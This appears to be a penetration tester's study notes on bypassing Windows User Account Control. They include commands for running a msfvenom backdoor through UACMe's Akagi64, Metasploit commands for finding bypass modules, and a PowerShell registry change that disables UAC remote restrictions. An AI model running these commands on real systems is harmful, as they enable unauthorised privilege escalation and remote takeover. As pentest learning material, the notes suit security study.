# how UAC bypass method works
https://cqureacademy.com/cqure-labs/cqlabs-how-uac-bypass-methods-really-work-by-adrian-denkiewicz/
https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/av-edr-evasion/uac-bypass#fodhelper.exe

## $ UACMe
https://github.com/hfiref0x/UACME
```PowerShell
# download Akagi (UACMe) and payload
# execute payload using Akagi64.exe
$ msfvenom ... > backdor.exe
meterpreter> upload backdor.exe
cmd> Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe
```

## https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/UACBypass.md#enumeration
## $ msf bypas
https://www.hackingarticles.in/multiple-ways-to-bypass-uac-using-metasploit/
```bash
msf> post/windows/gather/win_privs # verify if UAC is enabled

msf> search uac # search for module to bypas uac
```
## User Account Control: Filter administrator token for local accounts

User Account Control (UAC) blocks remote access for local administrators by default.  
This is known as **"UAC remote restrictions"**, which means that **even local admins cannot execute remote commands unless a specific setting is changed**.
This behavior has existed since Windows Vista and is enforced on Windows 10/11.

This setting controls whether local administrator accounts receive **full administrative privileges** when connecting remotely over the network (e.g., via SMB, WMI, or PowerShell Remoting).

Default behavior (`LocalAccountTokenFilterPolicy = 0` or missing):
- Local administrator accounts **do not** receive a full admin token when logging in remotely.
- Instead, they are issued a **filtered token**, with reduced privileges — similar to a standard user.

As a result, tools like `netexec` may fail to execute remote commands (e.g., `-x "whoami"`) even if the account belongs to the Administrators group.
    

### Conditions for Remote Restriction:
- **User Account Control (UAC)** is enabled, **and**
- The user connects **remotely**, e.g., via SMB or PowerShell Remoting.

![[Pasted image 20250408144309.png]]
### Solution: Change a registry setting to disable UAC remote restrictions
**PS command**
```powershell
New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name LocalAccountTokenFilterPolicy -Value 1 -PropertyType DWord -Force
```
**Manual**
1. Log in locally as offsec and open regedit
2. Navigate to: `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`
3. Create or edit the following value:
	```powershell
	DWORD: LocalAccountTokenFilterPolicy
	Value: 1
	```
	

This disables the UAC restriction for local accounts connecting remotely.
![[Pasted image 20250408144412.png]]

## UAC (User Account Control)
- **A local admin account is required on the machine to perform UAC bypass.**
- UAC prompts for the password of the local administrator if the user is not an admin or requests confirmation when performing certain actions.
- When utilizing a shell and attempting to execute actions with administrator privileges, there is no interaction possible with the UAC prompt.
- UAC enables the execution of a program with admin privileges.
- UAC should be set to Default or lower modes, not High.

**Process and UAC Interaction:**
- Typically, processes, e.g., cmd.exe, start with Medium integrity and are unable to perform administrative tasks when UAC is enabled.
- Running cmd.exe as an Administrator triggers a confirmation prompt, and the process runs with high integrity, allowing the execution of administrative commands
- UAC acts as a barrier for processes attempting to execute administrative commands, such as copying a file directly to `C:\`.
- Some applications auto-elevate to high integrity level without UAC confirmation. This behavior is built into the application's executable during compilation.
  - Information about this behavior can be found in the application's manifest. To check the manifest, use `pestudio.exe`, select the binary for examination, and find details in the manifest tab.